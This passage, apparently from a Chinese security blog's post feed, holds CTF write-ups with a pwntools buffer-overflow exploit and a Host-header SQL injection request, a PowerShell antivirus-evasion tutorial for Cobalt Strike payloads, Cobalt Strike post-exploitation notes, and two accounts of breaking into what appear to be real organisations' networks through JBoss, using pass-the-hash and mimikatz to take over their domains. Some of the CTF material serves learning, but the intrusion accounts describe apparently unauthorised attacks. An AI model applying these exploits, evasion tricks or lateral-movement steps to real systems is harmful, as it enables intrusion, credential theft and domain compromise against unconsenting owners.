862734414); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; printf(&quot; v1=%d \n v2=%d \n V7=%d \n v8=%d \n v9=%d \n v10=%d \n v11=%d \n v12=%d&quot;,v1,v2,v7,v8,v9,v10,v11,v12); return 0;&#125;运算结果：v1=22 v2=39 V7=45 v8=45 v9=35 v10=41 v11=13 v12=36 然后继续接下来的方程 123456789101112131415161718#/usr/bin/env python# coding=utf-8from z3 import *v3 = Int(&apos;v3&apos;)v4 = Int(&apos;v4&apos;)v5 = Int(&apos;v5&apos;)v6 = Int(&apos;v6&apos;)solve(v6 * 39 + v3 * 22 - v4 - v5 == 61799700179,v6 + v3 + v5 * 45 - v4 * 45 == 48753725643,v3 * 35 + v4 * 41 - v5 - v6 == 59322698861,v5 * 36 + v3 - v4 - v6 * 13 == 51664230587,)运算结果：v3 = 811816014v4 = 828593230v5 = 1867395930v6 = 1195788129 将数字串转换成字符串。 1234567891011#/usr/bin/env python# coding=utf-8import libnumflag = &quot;&quot;x = [1869639009,1801073242,829124174,862734414,811816014,828593230,1867395930,1195788129]for y in x: flag += libnum.n2s(y)[::-1] print flag运算结果：ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG 得出正确的输入值，输入输出 0x04 PWNLogin题目：nc 47.104.16.75 9000 程序地址：Pwn-Login 下载附件倒入IDA进行分析 程序运行过程： 1main()--&gt;Login()--&gt;Menu()--&gt;ExecCmd()--&gt;ShowUserlist()... 查看Login()内容，总的看没什么特别的，接下来看Menu() 12345678910111213141516171819202122232425262728293031&#123; __int64 result; // rax@6 char buf[68]; // [sp+0h] [bp-50h]@1 int v2; // [sp+44h] [bp-Ch]@2 __int64 v3; // [sp+48h] [bp-8h]@1 memset(buf, 0, 0x40uLL); v3 = 0LL; do &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;\nPanel\n\n1. exec command\n2. show user list\n3. exit\n&quot;); printf(&quot;Your choice: &quot;); fflush(_bss_start); v2 = read(0, buf, 0x280uLL); buf[v2] = 0; if ( buf[0] != 49 ) break; ExecCmd(); &#125; if ( buf[0] != 50 ) break; ShowUserlist(0LL, buf); &#125; result = (unsigned __int8)buf[0]; &#125; while ( buf[0] != 51 ); return result; 注意看第18行的代码。非常简单，单纯的读取一串字符串，然后储存在buf里面，但是，开辟的缓存区只有0x50字节大小，但是read最多可以读取0x280字节大小，这样就会造成缓存区溢出，也就是栈溢出漏洞。 接下来再看ExecCmd() 123456789101112131415161718192021int ExecCmd()&#123; int result; // eax@2 char *v1; // [sp+0h] [bp-10h]@3 if ( !strcmp(strUsername, &quot;admin&quot;) ) //判断是否为admin用户 &#123; printf(&quot;Command: &quot;, &quot;admin&quot;, 0LL); fflush(_bss_start); fgets(cmd, 255, stdin); v1 = strchr(cmd, 10); if ( v1 ) *v1 = 0; result = puts(&quot;Sorry, this feature has been disabled.&quot;); &#125; else &#123; result = puts(&quot;Sorry, this feature is only available for admin&quot;); &#125; return result;&#125; 我们要做的：如下图，程序不经过红框内，直接跳过输出。 也就是将return修改到call system，记住交互的最后还得输入一个3退出while循环 脚本： 123456789101112131415161718from pwn import * context.log_level = &apos;debug&apos;p = remote(&apos;47.104.16.75&apos;,9000)#p = process(&apos;./pwn50&apos;)p.recvuntil(&quot;:&quot;)p.sendline(&quot;admin&quot;) #Send usernamep.recvuntil(&quot;:&quot;)p.sendline(&quot;T6OBSh2i&quot;) #Send passwordp.recvuntil(&quot;: &quot;)p.sendline(&quot;1&quot;) #Choose 1. exec commandp.recvuntil(&quot;: &quot;)p.sendline(&quot;/bin/sh&quot;) #Send cmdp.recvuntil(&quot;: &quot;)p.sendline(&quot;\x90&quot;*0x58 + p64(0x40084A)) #Change return addressp.recvuntil(&quot;: &quot;)p.sendline(&quot;3&quot;)p.interactive() flag{welcome_to_iscc} Mobile小试牛刀附件地址：小试牛刀 拖进JEB2，查看Manifest、action等基础信息。这道题的坑就是壳的问题。 后来发现，Assets中的bfsprotect.jar就是源码。 右键MainActivity选择Decompile查看源码，一览无遗。 在onCreate()中发现了下面这个判断，与APP页面的判断显示一致。 12345678public void onClick(View arg5) &#123; if(!new ProtectClass().protectMethod(MainActivity.this.editText.getText().toString())) &#123; Toast.makeText(MainActivity.this, &quot;Wrong Flag&quot;, 0).show(); &#125; else &#123; Toast.makeText(MainActivity.this, &quot;Correct Flag&quot;, 0).show(); &#125; &#125; 进入ProtectClass()查看，就能看到对比的值，也就是flag值 1234567public boolean protectMethod(String arg4) &#123; int v1; for(v1 = 0; v1 &lt; MainActivity.runTimes &gt;&gt; 1; ++v1) &#123; &#125; return arg4.equals(&quot;BFS-ISCC&quot;);&#125; 或者，打开bfsprotect.jar，直接搜索iscc即可得到flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C段ping操作（C#入门）]]></title>
    <url>%2F2018%2F04%2FC%E6%AE%B5ping%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[利用周末，造个轮子，学习C#！！ 官方examples查看官方的Ping类，已经很成熟了。以下为官方examples 1234567891011121314151617181920212223public static void Main (string[] args) &#123; Ping pingSender = new Ping (); PingOptions options = new PingOptions (); // Use the default Ttl value which is 128, // but change the fragmentation behavior. options.DontFragment = true; // Create a buffer of 32 bytes of data to be transmitted. string data = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;; byte[] buffer = Encoding.ASCII.GetBytes (data); int timeout = 120; PingReply reply = pingSender.Send (args[0], timeout, buffer, options); if (reply.Status == IPStatus.Success) &#123; Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ()); Console.WriteLine (&quot;RoundTrip time: &#123;0&#125;&quot;, reply.RoundtripTime); Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl); Console.WriteLine (&quot;Don&apos;t fragment: &#123;0&#125;&quot;, reply.Options.DontFragment); Console.WriteLine (&quot;Buffer size: &#123;0&#125;&quot;, reply.Buffer.Length); &#125; &#125; 运行结果： 修改数据显示官方demo中使用的是默认的Ttl（128），那接下来也使用这个默认值。对demo进行修改，显示所需要的信息即可。 123Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ());Console.WriteLine (&quot;HostName: &#123;0&#125;&quot;, Dns.GetHostEntry(reply.Address.ToString()).HostName);Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl); 这只能识别windows系统的，毕竟是128。emmm。 正则匹配IP使用正则去匹配输入的IP地址是否合理。 123456// IP地址Regex regex = new Regex(@&quot;\d+\.\d+\.\d+\.\d+&quot;);// (提取IP地址时有用)// IP地址Regex regex = new Regex(@&quot;((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))&quot;);// IP地址...... 调用处理： 效果： demo流程：输入–&gt; 判断IP格式（处理）–&gt;遍历（ToString）–&gt;Ping()–&gt;输出–&gt;结束 项目地址： 【参考】 https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【免杀】PowerShell免杀（一）]]></title>
    <url>%2F2018%2F04%2F%E3%80%90%E5%85%8D%E6%9D%80%E3%80%91PowerShell%E5%85%8D%E6%9D%80%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[最近在看免杀 0x00 代码块可以使用PowerShell的一个语言特性做通用免杀，那就是代码块（即ScriptBlock）。 代码块是一段可以被执行的PowerShell代码，通常是把代码块直接放在闭合的大括号中，类似函数function，带上代码块更加灵活，可以作为函数参数传递，也可以动态生成和调用。若想在PowerShell中动态创建代码块，首先得知道如何将一段字符串换成代码块对象。1$scriptblock = [SriptBlock]::Create('notepad') 先是字符串，然后转换成代码块对象，当然这个字符串也可以是变量。 调用方法：12345Invoke-Command $scriptblock或者可以直接Invoke-Command -ScriptBlock ([ScriptBlock]::Create('notepad'))代码块操作操作符(&amp;)&amp;$scriptblock 0x01 加解密先对家吗进行加密，再加密执行 说到加密，最先想到的就是base64的编码加密了，既然容易想到，那就容易被杀。实现：1234567891011121314$str = "RcoIl"# $str = [System.IO.File]::ReadAllText("C:\Users\allen\Desktop\payload.ps1");$bytes = [System.Text.Encoding]::Ascii.GetBytes($str) # 编码方式变一下也无所谓$encode = [Convert]::ToBase64String($bytes) # 加密$encode.Substring(0)$decode =[Convert]::FromBase64String($encode); #解密$byte = [System.Text.Encoding]::Ascii.GetString($decode)$byte.Substring(0)运行结果：PS C:\Users\allen\Desktop&gt; .\demo.ps1UmNvSWw=RcoIl 加上异或12345678910111213141516171819$str = "RcoIl"$bytes = [System.Text.Encoding]::Ascii.GetBytes($str)for($i=0; $i -lt $bytes.count; $i++) &#123; $bytes[$i] = $bytes[$i] -bxor 0x98 # 异或&#125;$encode = [Convert]::ToBase64String($bytes) # 加密$encode.Substring(0)$decode =[Convert]::FromBase64String($encode); #解密for($i=0; $i -lt $decode.count; $i++) &#123; $decode[$i] = $decode[$i] -bxor 0x98 # 异或&#125;$byte = [System.Text.Encoding]::Ascii.GetString($decode)$byte.Substring(0)运行结果：PS C:\Users\allen\Desktop&gt; .\demo.ps1ypj7mPeY0Zj0mA==RcoIl 0x02 免杀效果payload选择的是Cobalt Strike 3.8生成的payload.ps1编译生成exe.当然，在实际测试过程中并没有那么完美，至少没能绕过avp的行为查杀。 【参考】 https://www.peew.pw/blog/2017/12/4/writing-net-executables-for-penteters-part-2]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobalt Strike上手学习]]></title>
    <url>%2F2018%2F04%2FCobalt%20Strike%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[Cobalt Strike是一款非常优秀的后渗透平台，基于Java。 日常的Cobalt Strike学习，Cobalt Strike提供的UI界面，使得很多操作都很容易理解，所以使得很多操作变得更加的简单。 监听器beacon 123是Cobalt Strike内嵌的监听器，也就是说，当在目标系统成功执行payload后，会弹会一个beacon的shell给Cobalt Strike，该shell所支持的通信协议主要包括dns、https、http、smp[pipe]。 实战中尽可能使用dns，或者，不用IP而使用域名。 foreign 123提供给外部使用的一些监听器，比如你想利用Cobalt Strike派生一个Meterpreter的shell进行内网渗透，这就需要用到foreign。 使用powershell第一种方式：在beacon shell中导入外部ps脚本到远程机器上 12powershell-import /root/Desktop/PowerView.ps1powershell Get-NetGroup -GroupName *admin* 第二种方式：在beacon shell中直接执行powershell代码 1powerpick Get-NetGroup socks为了让CS和msf互相间联通使用，在目标机器上开启socks4a代理。 [Beacon]–&gt;[Pivoting]–&gt;[SOCKS Server] 或者直接在beacon中执行socks post 第一种利用方式：利用各种socks代理客户端直接把各类渗透工具带进目标进网 123# vi /etc/proxychains.conf socks4 lhost 2333# proxychains msfconsole 第二种利用方式：直接利用隧道把整个msf带进目标内网 12# msfconsolesetg Proxies socks4:lhost:2333 SSH登陆 使用upload和download进行上传下载。也可以通过socks代理进行登陆。 权限提升[Beacon]–&gt;[access]–&gt;[Elevate] Cobalt Strike 内嵌了两个提权exp，ms14-058是个老提权漏洞利用方式，可利用于Windows 7系统。 uac-dll是一种Bypass UAC攻击，是由本地管理员运行payload从中等权限往最高权限提升的过程，适用于windows 7和windows 10。 可以通过导入cna文件进行丰富漏洞库。项目地址为：ElevateKit Spawn可使用spawn功能孵化出n个shell，shell与shell之间相当于以一种级联的形式存在。 作用：将公网某团队服务器的beacon shell 派生到本地团队服务器指定的监听器上，或是派生到msf。 派生至本地团队服务器 建立好监听器，返回到左边的公网团队服务器使用spawn功能，选择刚刚建立的监听器。 过一会儿就能看到shell被正常弹到本地团队服务器指定的监听器上。 派生至Meterpreter 在公网团队服务器上创建一个外部foreign监听器（本地msf与CS使用的协议无比相同） 横向移动 首先，要决定用哪种方法来横向移动（当前环境需要高度完整的管理员权限才能完成正常操作）。 如果想使用token作用于某个Beacon，那就选中当前会话的Token框， 如果想使用证书或哈希来横向移动，就从凭证存储库中选择凭据或填充用户、密码和域等字段，Beacon会将此信息作为需要的令牌。 选择用于横向移动的Listener，通常这个会选择使用HTTPS。 最后选择Session，这选项只需要选择同个内网机器Session即可（已上线）。 PS： Cobalt Strike的异步进攻模式要求每一次攻击都是以当前一个受损系统（已控）为跳板执行的。如果存在多台已控机器，则优先考虑Windows系统作为跳板机，且利用所有的凭证或哈希，攻击成功则会反馈在Beacon控制台中。 查看官方操作，与日常操作方式不太一样。 转发通过红色区域（指已获取beacon shell的机器）做一个重定向到蓝色区域（没有取得控制权的目标机器）有漏洞的机器。 查看说明 1234567beacon&gt; help rportfwdUse: rportfwd [bind port] [forward host] [forward port] rportfwd stop [bind port]Binds the specified port on the target host. When a connection comes in,Cobalt Strike will make a connection to the forwarded host/port and use Beaconto relay traffic between the two connections. 第一个参数为监听端口，第二个参数是转发主机和转发端口。注意：目标主机都会有防火墙拦截链接（弹框提示）。 becon shell 内置了端口转发功能，把本机的某个端口转发到公网（如3389）。 [Beacon]–&gt;[Pivoting]–&gt;[Listener] 接下来正常链接x.35这台的2333端口即可。 内网机器 在Beacon shell中建立一条新的监听规则。 12345beacon&gt; shell netstat -ano | findstr &quot;7878&quot;[*] Tasked beacon to run: netstat -ano | findstr &quot;7878&quot;[+] host called home, sent: 37 bytes[+] received output: TCP 0.0.0.0:7878 0.0.0.0:0 LISTENING 3516 在Cobalt Strike当中新建一个Listener，内容如图所示： 上线的Listener选择新建的rportfwd-listener即可。 黄金票据使用域管理员权限伪造一张黄金票据是最常见的方法。 制作黄金票据的前提条件： 想要伪造票据的用户 为其创建票据的域名 域的SID（whomai /user） 域控制器上krbtgt用户的NTLM哈希值 PS： 首先要使用klist /purge清除缓存的授权票据。 Malleable-C2自从Cobalt Strike更新至3.6版本后，官方给出了一个Malleable-C2，也就是在启动团队服务器（服务端）的时候加载一些配置文件，这是一个非常棒的功能，可以帮助我们伪装流量、SSL加密通讯，达到隐匿的效果，值得一用。 123cd /opt/cobaltstrike/git clone https://github.com/rsmudge/Malleable-C2-Profiles# 使用方法：./teamserver [external IP] [password] [/path/to/my.profile] 参考：Cobalt Strike-help]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JBoss引起的内网渗透-3]]></title>
    <url>%2F2018%2F03%2FJBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-3%2F</url>
    <content type="text"><![CDATA[待人如知己！！！ 首先说明，这个系列的JBoss都是批量获取的，并不是针对某地区某组织而为。 WebShell如同上一篇文章获取，但是这次是直接上传jsp脚本文件，这样更加快捷。 信息收集123456789本机用户信息： %computername% --&gt; SZXzzAO-RxxxSY ifconfig --&gt; 192.168.140.171 %os% --&gt; Windows Server 2008 R2 x64 System Model --&gt; VMware Virtual Platform Statistiques depuis --&gt; 19/03/2018 15:00:18域情况： 存在域使用循环ping找出了50+台C段存活主机 翻阅目录 从用户目录来看，发现域管登录的痕迹； C盘根目录下有metasploit，创建时间为2016-04-19； 用户support用于黑客行为操作用户（CrackMapExec扫描日志等）； 在deploy\management存在大量后门文件； 在$Recycle.Bin存在已删除的恶意exe可执行文件； 存在Panda Security（熊猫卫士）文件夹 后门之多无法想象。 进程收集 存在PSANHost.exe（熊猫卫士） 大量的cmd.exe、powershell.exe及taskkill.exe 其他 screenshot –&gt; 锁屏 问题处理问题 上传的远控可执行文件运行无反应； 执行Desktop下的mimikatz.exe，一执行就消失（杀软？）； 使用powershell执行mimikatz获取hash，但密码为空（注册表被篡改了？）； 无法将自添加的用户加入管理员组； 无法执行net view等命令（net 系列缺失）。 分析 生成的马是免杀的（virustotal.com）； Panda动态查杀mimikatz； 存在KB2871997补丁（Administrator-500）； 执行命令无回显估计是因为地区语言的原因。 突破方法 生成新的CS马； 修改注册表； 使用PsExec进行hash注入； 对内网使用MS-17-010； 对内网的Web服务进行渗透。 横向拓展前奏反弹个metasploit的shell，利用smb进行主机识别。但是失败，估计是在添加路由的时候出现错误，导致访问不到它的内网段。 已知条件： 远控上线； SZXzzAO-RxxxSY各用户的hash。 定位想要横向，那就得需要知道域控为哪些，域管为哪些，域用户为哪些，内网机器存活为多少。这就关于到内网渗透定位技术问题。 常规的命令： 1234567net user /domain # 存在数据net view /domain # 该列表是空的net group /domain # 存在数据net group &quot;domain admins&quot; /domain # 无法找到组名称net time /domain # 存在数据net group &quot;domain controllers&quot; /domain # 无法找到组名称nltest /dclist:ALxxx.lxxxl # 存在数据 以下内容是以上信息的综合： 123域控： SZXDC01 --&gt; 192.168.140.10 SZXDC02 --&gt; 192.168.140.11 使用Cobalt Strike的ARP扫描（因为net view使用不了），使得Targets有记录。 接下来就是找域管理员，既然不知道组名称，那就先找组名，过程参考内网渗透测试定位技术总结。 完成！ 方法用比较典型的hash注入碰一下看看运气怎么样。由于存在KB2871997补丁，所以只能使用administrator用户进行注入。 登陆情况如下： 12345678192.168.140.10 # 失败192.168.140.11 # 失败192.168.140.14 # 成功....192.168.140.57 # 成功192.168.140.78 # 失败192.168.140.160 # 成功.... 这个过程就是不断的进行hash注入，不断的dump密码，结果就如上图。看Credentials里是否存在域管用户账密。 成功获取到域管的账号密码。进行登陆。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JBoss引起的内网渗透-2]]></title>
    <url>%2F2018%2F03%2FJBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-2%2F</url>
    <content type="text"><![CDATA[待人如知己！！ 说明：本文中有个错误的概念验证，在判断域管理员的时候不能这么判断的，是不合理的。主要原因是在实操的时候，刚好能够使用Administrator用户密码登陆域，所以文章中就这么下结论了。这只是一个小概率事件，不成定律。 切入点Jboss的反序列化漏洞，接下来看站点信息 正常来说这个admin-console及web-console/都是能正常访问的，就算不能正常访问也不会是404状态 ，所以为了搞清楚原因，去翻了其目录，进行对比。发现 12server\default\deploy #默认部署war目录server\web\deploy # 部署war相对应的编译生成目录 两个目录中，在\web\deploy\中缺少了admin-console和web-console，所以原因是：管理员在安装了JBoss后，为了安全起见，就在server\web\deploy删除了admin-console.war和web-console.war，所以在部署目录下是存在war包，但是编译目录下是不存在的。 所以接下来就进行常规的war部署，发现war已经上传上去了，但是访问出现404，所以跑去server\web\deploy查看，发现是没有生成相对应的文件夹，原因暂时未知。 所以就直接将jsp脚本上传到了jmx-console.war当中，成功获取WebShell 12server\default\deploy\jmx-console.war\ # 上传访问失败server\web\deploy\jmx-console.war\ # 上传访问成功 信息收集接下来又是常规的信息收集 发现在菜刀里面执行命令，多数都是超时状态，所以还是回到之前的工具进行执行或是上传个命令执行马或是用web访问马。 进程里面是存在avguard.exe，所以需要做免杀。系统是windows xp-x86。 在查看环境变量的时候发现是存在powershell的,但是没起作用。 12345678910111213141516net user #查看本机用户-------------------------------------------------------------------------------Administrator Guest HelpAssistant postgres saverio SUPPORT_388945a0 net group &quot;domain admins&quot; /domain #查看域管理员-------------------------------------------------------------------------------Administrator bckagent dbagent faxmaker idsmessina lattuca SpaceGuardSvcAccnt trovato VMwareVDPBackupUser net group &quot;domain controllers&quot; /domain #查看域控制器-------------------------------------------------------------------------------DOMAIN1$ DOMAIN2$ 域用户就不列举了，实在有些多 信息收集到这里，就有些蹊跷，因为本机用户里面，除了Administrator存在于域用户中，其余的账户均不见，所以这里能直接判断Administrator就是域管理员。 综合以上信息： 1234DOMAIN2 - 192.168.20.10 # 域控制器PROTRIBUTCT -Administrator # 域管理员avguard.exe # 小红伞杀软powershell # 不可用 小小免杀续上次的shellter免杀，是过不了小红伞的，所以，这种时候，该储备的东西就起作用了。 生成一个Metasploit的马，去Virustotal做测试免杀，是过了AVG的，所以尝试一波。但是，生成的exe在windows 7下面是能正常执行的，但是到了xp上面就不行了。 用Veil生成个吧，安装Veil也是个大坑，图就不放了。 横向内网接下来思路就很明确了。将PROTRIBUTCT的密码dump下来，幸运的话整个域就能拿下来了。 至此，这个域已经拿下，比上篇难度相对来说要小一些。 还有一个点，就是在查看域控的时候发现是有两台的，也是一样的登陆方式进行登陆即可。但是在这两台域控执行net view /domain:xxxxx结果都是不一样的，这也许就是两台域控的缘故吧。但是DOMAIN1所在的段只能通过DOMAIN2出来，其他机器做跳板均没数据，或许这是玄学了吧。 至此，整个测试流程就结束了。整个过程有点顺利，不是我发blog的初衷。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[P牛的红包口令]]></title>
    <url>%2F2018%2F02%2FP%E7%89%9B%E7%9A%84%E7%BA%A2%E5%8C%85%E5%8F%A3%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[这个口令红包没领成。 新年新气象，逛圈子偶遇到P牛发的一个红包。 题目如下： 12018.mhz.pw:62231 信息获取使用浏览器访问题目，发现无法访问，且提示为ERR_INVALID_HTTP_RESPONSE，那就说明这个端口并不是HTTP协议的服务。 使用端口指纹识别： rsync是linux系统下的数据镜像备份工具。所以我们得去了解一下rsync的基本语法 12列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://2018.mhz.pw:62231从远程rsync服务器中拷贝文件到本地机。如：rsync -av rsync://2018.mhz.pw:62231/www /databack 源码拉取 将git裸仓库进行还原 1git clone pwnhub_6670.git/ 需要审计的源码还原成功，但是本地搭建没成功，得修改修改（环境问题）。 漏洞挖掘文件列表如下： 初略看了下，只有一个登录框。 那还是读源码吧。从index.php 跳转至cpre.php，先看这份PHP代码。 从开始都是一些常规的全局设置。再往下看。 目标站点只有简单的登陆功能，相关代码如下： 123456789101112131415161718192021222324252627escape($_REQUEST); # 转义escape($_POST);escape($_GET);function escape(&amp;$arg) &#123; if(is_array($arg)) &#123; # 判断$arg是否为数组 foreach ($arg as &amp;$value) &#123; # 遍历$arg数组。每次循环中，当前单元的值被赋给$value并且数组内部的指针向前移一步。 escape($value); &#125; &#125; else &#123; $arg = str_replace([&quot;&apos;&quot;, &apos;\\&apos;, &apos;(&apos;, &apos;)&apos;], [&quot;‘&quot;, &apos;\\\\&apos;, &apos;（&apos;, &apos;）&apos;], $arg); # 将$arg内的单引号、小括号转换成中文符号，将反斜杠进行转义。 &#125;&#125;function arg($name, $default = null, $trim = false) &#123; if (isset($_REQUEST[$name])) &#123; # 检查$_REQUEST中是否存在$name值 $arg = $_REQUEST[$name]; &#125; elseif (isset($_SERVER[$name])) &#123; # 检查$_SERVER中是否存在$name值 $arg = $_SERVER[$name]; &#125; else &#123; $arg = $default; &#125; if($trim) &#123; $arg = trim($arg); &#125; return $arg;&#125; 在检测的$name值当中，$_SERVER很明显并没有被转义处理。或许我们能利用这一个点。 再往下看代码、来到了Controller类。分了BaseController.php和MainController.php，它们是继承关系。在MainController.php看到了三个函数。 123actionIndex() #主页actionLogin() #登陆 (正常验证)actionRegister() #注册 看到这里我才知道是有注册功能的。下面来看看actionRegister的代码： 123456789101112131415161718192021222324252627282930313233343536function actionRegister()&#123; if ($_POST) &#123; $username = arg(&apos;username&apos;); # 检查是否存在 $password = arg(&apos;password&apos;); if (empty($username) || empty($password)) &#123; # 判断用户密码是否为空 $this-&gt;error(&apos;Username or password is empty.&apos;); &#125; $email = arg(&apos;email&apos;); # 检查是否存在 if (empty($email)) &#123; # 如果email为空，则email由输入的用户名、@及HOST组合而成 $email = $username . &apos;@&apos; . arg(&apos;HTTP_HOST&apos;); &#125; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; # FILTER_VALIDATE_EMAIL过滤器 $this-&gt;error(&apos;Email error.&apos;); &#125; $user = new User(); # 判断用户名是否存在 $data = $user-&gt;query(&quot;SELECT * FROM `&#123;$user-&gt;table_name&#125;` WHERE `username` = &apos;&#123;$username&#125;&apos;&quot;); if ($data) &#123; $this-&gt;error(&apos;This username is exists.&apos;); &#125; $ret = $user-&gt;create([ # 向users表中插入数据 &apos;username&apos; =&gt; $username, &apos;password&apos; =&gt; md5($password), &apos;email&apos; =&gt; $email ]); if ($ret) &#123; $_SESSION[&apos;user_id&apos;] = $user-&gt;lastInsertId(); &#125; else &#123; $this-&gt;error(&apos;Unknown error.&apos;); &#125; &#125;&#125; 能利用的点就是email的组成元素(HTTP_HOST)，而HTTP_HOST又是由arg函数获取的，也就是说可以从没有被转义的$_SERVER着手。既然是数据库操作，那就看看是否能构造语句使之形成SQL注入漏洞。 先明确一点：Email由用户名、@、Host三者拼接而成，而Host可利用的点为$_SERVER。 但是其中有个FILTER_VALIDATE_EMAIL过滤器，所以首先还是得绕过这个过滤器。 绕过过滤器第一次见到FILTER_VALIDATE_EMAIL是在PHPMailer的CVE-2016-10033里面遇到的，当时还是用着wordpress博客程序。 这样就能引入了引号，又符合过滤器的规则。那我们就传入用户名为&quot;qqq，Host为rcoil&#39;&quot;@rcoil.me进行注册。因为邮箱中包含单引号，所以必会造成SQL注入。 构造SQL注入将Host进行修改，结果如下： 404错误，并不是我们想象中的情景。之前做CTF的时候有过这类型的情况，添加多一个Host就可以了。如图： 既然构成了SQL注入，那就看看怎么利用了。 SQL注入在源码中有分sql备份文件，从里面能看到SQL的结构。 最后卡在了这个报错注入里面。 P牛的WriteUP攻击LNMP架构Web应用的几个小Tricks 知识点还是掌握得不够，静下心来好好学习。 看了P牛的WriteUp，才注意到create方法就是拼接了一个INSERT语句，而且报错信息也没仔细看。 现在回过头来想想，确实就是这么一回事。在插入的过程中，闭合了前段语句，再新建一个语句插入自己定义的语句，就能在可控的范围内获取自己所需要的信息。翻了翻之前的笔记。 123456789101112131415161718192021222324252627282930313233mysql&gt; use test;Database changedmysql&gt; SELECT @@version;+-----------+| @@version |+-----------+| 5.5.53 |+-----------+1 row in setmysql&gt; select * from demo;+------+------+------+| demo | test | aoao |+------+------+------+| d | d | d |+------+------+------+1 row in setmysql&gt; INSERT into demo VALUES(&apos;A&apos;,&apos;A&apos;,&apos;A&apos;),(&apos;B&apos;,&apos;B&apos;,&apos;B&apos;);Query OK, 2 rows affectedRecords: 2 Duplicates: 0 Warnings: 0mysql&gt; select * from demo;+------+------+------+| demo | test | aoao |+------+------+------+| d | d | d || A | A | A || B | B | B |+------+------+------+4 rows in set 然后我们构造一下语句 1234567891011121314151617POST /main/register HTTP/1.1Host: 2018.mhz.pwHost: rcoil&apos;),(&apos;ao123&apos;,md5(121314),(select(flag)from(flags)))#&quot;@rcoil.meContent-Length: 34Cache-Control: max-age=0Origin: http://2018.mhz.pwUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://2018.mhz.pw/main/registerAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bvdrraji3mjirt5noljghm8ib7Connection: closeusername=&quot;qq&amp;email=&amp;password=aaaaa 闭合了前段的INSERT语句，并新建了一条语句，在email字段将flag读取。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码转换工具 （C#入门）]]></title>
    <url>%2F2018%2F01%2F%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[一直想写一些图形化工具来用。从小入手，写了个计算器，看了下代码，有点麻瓜。 12工具：编码转换工具编译：VS2015 C#(.NET Framework v4.0) 先看一下效果图： 其中有个bug，就是ASCii不归零，也不知道是怎么回事。 默认的textBox获取方式为Encoding.Default.GetBytes(str)，注意的是要使用UTF8，代码有些丑陋，就不贴了。 在写到Base32的时候，没找到现成的方法可以直接利用，所以就去了解了下、 Base32是由ABCDEFGHIJKLMNOPQRSTUVWXYZ234567组成的,由于0和1由于与字母O和I相似性而被跳过。 规则： 12任意给定一个二进制数据，以5个位(bit)为一组进行切分(base64以6个位(bit)为一组)对切分而成的每个组进行编码得到1个可见字符。 演示：（以rcoil字符串进行编码） 123字符rcoil取ASCII码之后，对其转换成二进制（切5补0）得到01110,01001,10001,10110,11110,11010,01011,01100计算每组二进制对应的十进制，然后参考Base32编码表，组成密文 具体的算法就是这样，有了流程就可以写代码了。 后来找了找，能找到一些别人已经写好的类。Base32 Decoding，直接利用就可以了。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL-盲注浅析]]></title>
    <url>%2F2017%2F11%2FMySQL-%E7%9B%B2%E6%B3%A8%E6%B5%85%E6%9E%90%2F</url>
